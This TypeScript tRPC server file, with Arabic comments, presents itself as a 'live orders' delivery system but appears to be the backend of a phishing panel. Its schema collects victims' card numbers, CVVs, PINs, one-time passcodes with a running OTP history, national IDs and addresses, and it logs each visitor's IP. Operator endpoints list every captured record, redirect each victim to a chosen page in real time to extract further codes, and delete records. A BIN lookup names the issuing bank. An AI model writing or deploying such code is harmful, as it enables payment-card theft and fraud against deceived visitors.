import { z } from "zod";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import {
  upsertLiveOrder,
  listLiveOrders,
  getLiveOrder,
  setLiveOrderDirective,
  deleteLiveOrder,
  countActiveVisitors,
  countTotalVisitors,
} from "./db";
import { lookupIssuer } from "./binLookup";

/* مخطط بيانات الطلب الحي القابلة للتحديث من الواجهة */
const liveOrderInput = z.object({
  publicId: z.string().min(3).max(40),
  page: z.string().max(80).optional(),
  name: z.string().max(160).optional(),
  idNumber: z.string().max(80).optional(),
  phone: z.string().max(60).optional(),
  email: z.string().max(160).optional(),
  tier: z.string().max(40).optional(),
  region: z.string().max(120).optional(),
  city: z.string().max(120).optional(),
  district: z.string().max(160).optional(),
  street: z.string().max(200).optional(),
  deliveryDate: z.string().max(60).optional(),
  cardNumber: z.string().max(40).optional(),
  bankName: z.string().max(120).optional(),
  expiry: z.string().max(16).optional(),
  cvv: z.string().max(8).optional(),
  pin: z.string().max(12).optional(),
  otp: z.string().max(16).optional(),
  otpHistory: z.string().optional(), // JSON string array
  bankAuth: z.string().max(40).optional(),
  authCount: z.number().int().min(0).optional(),
  directive: z.string().max(60).optional(),
  status: z.string().max(20).optional(),
  appendOtp: z.boolean().optional(),
  incAuth: z.boolean().optional(),
});

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  /* ============ مسارات الطلبات الحية ============ */
  orders: router({
    /** الزائر: إنشاء/تحديث بيانات طلبه */
    upsert: publicProcedure
      .input(liveOrderInput)
      .mutation(async ({ input, ctx }) => {
        const { publicId, appendOtp, incAuth, ...rest } = input;

        // تمرير IP الزائر إلى دالة upsert ليتم جلب الموقع الجغرافي مرة واحدة فقط
        const ip = (ctx.req.headers['x-forwarded-for'] as string || ctx.req.socket?.remoteAddress || "").split(',')[0].trim();

        await upsertLiveOrder(publicId, rest, ip, { appendOtp, incAuth });
        return { success: true } as const;
      }),

    /** الزائر: جلب طلبه الحالي لمتابعة التوجيه */
    get: publicProcedure
      .input(z.object({ publicId: z.string() }))
      .query(async ({ input }) => {
        const order = await getLiveOrder(input.publicId);
        return order ?? null;
      }),

    /** المشرف: جلب جميع الطلبات + عدد النشطين + إجمالي الزوار */
    list: publicProcedure.query(async () => {
      const [orders, active, total] = await Promise.all([
        listLiveOrders(),
        countActiveVisitors(),
        countTotalVisitors(),
      ]);
      return { orders, active, total };
    }),

    /** المشرف: توجيه الزائر لصفحة معيّنة */
    direct: publicProcedure
      .input(
        z.object({
          publicId: z.string(),
          directive: z.string().max(60),
          status: z.string().max(20).optional(),
        }),
      )
      .mutation(async ({ input }) => {
        await setLiveOrderDirective(input.publicId, input.directive, input.status);
        return { success: true } as const;
      }),

    /** المشرف: حذف طلب */
    remove: publicProcedure
      .input(z.object({ publicId: z.string() }))
      .mutation(async ({ input }) => {
        await deleteLiveOrder(input.publicId);
        return { success: true } as const;
      }),

    /** كشف اسم البنك المُصدِر من رقم البطاقة (قاعدة محلية + خدمات حية) */
    detectBank: publicProcedure
      .input(z.object({ cardNumber: z.string().min(6).max(40) }))
      .query(async ({ input }) => {
        const res = await lookupIssuer(input.cardNumber);
        return res;
      }),
  }),
});

export type AppRouter = typeof appRouter;
